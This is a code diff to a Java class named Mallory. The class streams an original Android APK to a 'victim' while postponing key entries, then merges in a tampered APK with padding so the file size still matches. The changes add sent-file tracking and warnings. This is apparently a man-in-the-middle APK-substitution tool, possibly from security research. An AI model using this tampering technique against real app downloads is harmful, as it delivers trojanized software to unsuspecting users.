@@ -27,8 +27,10 @@ import java.io.InputStream;
 import java.io.OutputStream;
 import java.util.ArrayList;
 import java.util.HashMap;
+import java.util.HashSet;
 import java.util.List;
 import java.util.Map;
+import java.util.Set;
 import java.util.zip.Deflater;
 import org.apache.commons.compress.archivers.zip.UnparseableExtraFieldData;
 import org.apache.commons.compress.archivers.zip.UnrecognizedExtraField;
@@ -116,6 +118,7 @@ public class Mallory {
     private ZipArchiveOutputStream zop;
     private File newApk;
     private File tempApk;
+    private Set<String> sentFiles;
     
     /**
      * List of all sent files, with data and hashes.
@@ -186,6 +189,7 @@ public class Mallory {
         
         // Deflater to re-compress uncompressed data read from ZIP stream.
         def = new Deflater(9, true);
+        sentFiles = new HashSet<String>();
         
         // Generate temporary APK filename
         tempApk = File.createTempFile("temp_apk", ".apk", new File(TEMP_DIR));
@@ -275,7 +279,7 @@ public class Mallory {
             
             // META-INF files should be always on the end of the archive, 
             // thus add postponed files right before them
-            if (isPostponed(curName)){
+            if (isPostponed(ze)){
                 // Capturing interesting files for us and store for later.
                 // If the file is not interesting, send directly to the stream.
                 if (!quiet)
@@ -287,6 +291,9 @@ public class Mallory {
                 // Add file data to the stream
                 zop.write(byteData, 0, infl);
                 zop.closeArchiveEntry();
+                
+                // Mark file as sent.
+                addSent(curName);
             }
             
             ze = zip.getNextZipEntry();
@@ -378,10 +385,12 @@ public class Mallory {
         ZipArchiveOutputStream zop_back = zop;
         zop = zop.cloneThis();
         
+        // Set temporary byte array output stream, so original output stream is not
+        // touched in this phase.
         ByteArrayOutputStream bos = new ByteArrayOutputStream();
         zop.setOut(bos);
         
-        mergeTamperedApk(false);
+        mergeTamperedApk(false, false);
         zop.flush();
         
         // Now output stream almost contains APK file, central directory is not written yet.
@@ -422,6 +431,15 @@ public class Mallory {
         if (padlen < 0){
             throw new IllegalStateException("Padlen cannot be negative, please increase padding size");
         }
+        
+        // Close input streams for tampered APK
+        try {
+            zip.close();
+            fis.close();
+        } catch(Exception e){
+            if (!quiet)
+                e.printStackTrace(System.err);
+        }
                 
         // Merge again, now with pre-defined padding size.
         fis = new FileInputStream(newApk);
@@ -432,7 +450,7 @@ public class Mallory {
         long writtenBeforeDiff2 = zop.getWritten();
         
         // Merge tampered APK, now for real, now with computed padding.
-        mergeTamperedApk(true);
+        mergeTamperedApk(true, true);
         zop.flush();
         
         long writtenAfterMerge2 = zop.getWritten();
@@ -472,15 +490,17 @@ public class Mallory {
     
     /**
      * Returns true if given file name should be postponed (is modified in tampering process).
-     * @param curName 
+     * @param ze 
      * @return  
      */
-    public boolean isPostponed(String curName){
+    public boolean isPostponed(ZipArchiveEntry ze){
+        final String curName = ze.getName();
         return (curName.startsWith(META_INF)
                  || CLASSES.equalsIgnoreCase(curName)
                  || ANDROID_MANIFEST.equalsIgnoreCase(curName)
                  || RESOURCES.equalsIgnoreCase(curName)
-                 || curName.endsWith(".xml"));
+                 || curName.endsWith(".xml")
+                 || (ze.getMethod() == ZipArchiveOutputStream.DEFLATED && curName.endsWith(".png")));
     }
     
     /**
@@ -554,17 +574,17 @@ public class Mallory {
      * @param addPadding
      * @throws IOException 
      */
-    public void mergeTamperedApk(boolean addPadding) throws IOException{
+    public void mergeTamperedApk(boolean addPadding, boolean forReal) throws IOException{
         // Read the tampered archive
         ZipArchiveEntry ze = zip.getNextZipEntry();
         
+        Set<String> files = new HashSet<String>();
         long padlenLeft = padlen;
         while(ze!=null){
             
             // Data for entry
             byte[] byteData = Utils.readAll(zip);
             byte[] deflData = new byte[0];
-            int infl = byteData.length;
             int defl = 0;
             
             long padd2add=-1;
@@ -588,6 +608,8 @@ public class Mallory {
             final String curName = ze.getName();
             PostponedEntry al = new PostponedEntry(ze, byteData, deflData);
             
+            files.add(curName);
+            
             // Compare posponed entry with entry in previous
             if (alMap.containsKey(curName)==false || alMap.get(curName)==null){
                 // This element is not in the archive at all! 
@@ -609,11 +631,11 @@ public class Mallory {
                 // All files are read linary from the new APK file
                 // thus it will be put to the archive in the right order.
                 PostponedEntry oldEntry = alMap.get(curName);
-                boolean wasPostponed = isPostponed(curName);
+                boolean wasPostponed = isPostponed(oldEntry.ze);
                 if (  (oldEntry.hashByte==null && al.hashByte!=null)
                    || (oldEntry.hashByte!=null && oldEntry.hashByte.equals(al.hashByte)==false)    
-                   || (oldEntry.hashDefl==null && al.hashDefl!=null)
-                   || (oldEntry.hashDefl!=null && oldEntry.hashDefl.equals(al.hashDefl)==false)
+                   || (defl>0 && (oldEntry.hashDefl==null && al.hashDefl!=null))
+                   || (defl>0 && (oldEntry.hashDefl!=null && oldEntry.hashDefl.equals(al.hashDefl)==false))
                    ){
                     // Element was changed, add it to the zop 
                     // 
@@ -623,7 +645,7 @@ public class Mallory {
                     }
                     
                     if (!wasPostponed && !quiet){
-                        System.err.println("  Warning: This file was already sent to the victim!!!");
+                        System.err.println("  Warning: This file was already sent to the victim (file was not postponed) !!!");
                     }
 
                     // Apply padding
@@ -647,7 +669,7 @@ public class Mallory {
                         padlenLeft -= padd2add;
                         if (!quiet) System.err.println("  Added padding: " + padd2add + "; left: " + padlenLeft);
                     }
-
+                    
                     al.dump(zop);
                 }
             }
@@ -655,9 +677,38 @@ public class Mallory {
             ze = zip.getNextZipEntry();
         }
         
+        // Check if some file from the original file is not in the modified file.
+        if (forReal && !quiet){
+            // Iterate over map files and lookup the same among modified files.
+            for(String oldFile : alMap.keySet()){
+                if (files.contains(oldFile)==false){
+                    if (sentFiles.contains(oldFile)){
+                        System.err.println("Warning: File from original file ["+oldFile+"] was not found in tampered file and file was already sent!!!");
+                    } else {
+                        System.err.println("Warning: File from original file ["+oldFile+"] was not found in tampered file!");
+                    }
+                }
+            }
+        }
+        
         if (!quiet && addPadding && padlenLeft > 0){
             System.err.println("Warning! Not enough modified files to add required padding. Left: " + padlenLeft + "/" + padlen);
         }
+    }
+    
+    /**
+     * Adds given file to a sent map.
+     * @param curName 
+     */
+    private void addSent(String curName) {
+        if (sentFiles.contains(curName)) {
+            if (!quiet) {
+                System.err.println("  Warning: File was already sent, sending twice???");
+            }
+        } else {
+            sentFiles.add(curName);
+        }
+
     }
     
     /**
